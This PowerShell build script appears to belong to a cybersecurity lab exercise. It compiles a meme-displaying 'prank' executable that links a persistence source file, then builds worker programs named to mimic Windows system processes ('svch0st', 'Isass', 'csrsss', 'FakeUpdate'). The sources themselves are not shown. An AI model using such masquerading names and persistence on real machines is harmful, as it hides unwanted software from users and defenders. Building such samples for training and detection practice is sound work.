param(
    [string]$OutputDirectory = (Join-Path $PSScriptRoot 'bin')
)

$ErrorActionPreference = 'Stop'
$compiler = Join-Path ([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()) 'csc.exe'
if (-not (Test-Path -LiteralPath $compiler)) {
    throw 'Use Windows PowerShell 5.1 with the .NET Framework 4.x compiler installed.'
}

$null = New-Item -ItemType Directory -Path $OutputDirectory -Force
$output = Join-Path $OutputDirectory 'DoNtStopMePorfavor.exe'
$memeFolder = Join-Path $PSScriptRoot 'Meems'
if (-not (Test-Path -LiteralPath $memeFolder -PathType Container)) {
    throw 'Missing Meems folder. Add the participant-provided JPG/PNG images before building.'
}
$images = @(Get-ChildItem -LiteralPath $memeFolder -File | Where-Object { $_.Extension -in @('.jpg', '.jpeg', '.png') } | Sort-Object Name)
if ($images.Count -eq 0) { throw 'No JPG/PNG images found in Meems.' }
Add-Type -AssemblyName System.Drawing
$resources = @()
for ($i = 0; $i -lt $images.Count; $i++) {
    $image = [System.Drawing.Image]::FromFile($images[$i].FullName)
    try {
        if ($image.Width -gt 8192 -or $image.Height -gt 8192) {
            throw "Image dimensions exceed the 8192-pixel build limit: $($images[$i].Name)"
        }
    }
    finally { $image.Dispose() }
    $resources += "/resource:$($images[$i].FullName),Meme.$('{0:D3}' -f $i)"
}
& $compiler /nologo /target:winexe /platform:anycpu /optimize+ /reference:System.Windows.Forms.dll /reference:System.Drawing.dll /reference:Microsoft.CSharp.dll "/out:$output" @resources (Join-Path $PSScriptRoot 'DoNtStopMePorfavor.cs') (Join-Path $PSScriptRoot 'LabPersistence.cs')
if ($LASTEXITCODE -ne 0) {
    throw "Prank compilation failed with exit code $LASTEXITCODE."
}
Write-Output "Built $output"
$workers = Join-Path $OutputDirectory 'Workers'
$null = New-Item -ItemType Directory -Path $workers -Force
$names = @('FakeUpdate', 'MemeWroker', 'SnackScaner', 'svch0st', 'Isass', 'csrsss')
foreach ($name in $names) {
    $worker = Join-Path $workers "$name.exe"
    $metadata = Join-Path ([IO.Path]::GetTempPath()) ("CYBRSLC&CDRU-Metadata-" + [Guid]::NewGuid().ToString('N') + '.cs')
    try {
        [IO.File]::WriteAllText($metadata, "[assembly: System.Reflection.AssemblyTitle(`"$name.exe`")]")
        & $compiler /nologo /target:exe /platform:anycpu /optimize+ "/out:$worker" (Join-Path $PSScriptRoot 'LabWorker.cs') $metadata
        if ($LASTEXITCODE -ne 0) { throw "Worker compilation failed: $name" }
    }
    finally {
        if (Test-Path -LiteralPath $metadata) { Remove-Item -LiteralPath $metadata }
    }
    Write-Output "Built lab worker $worker"
}
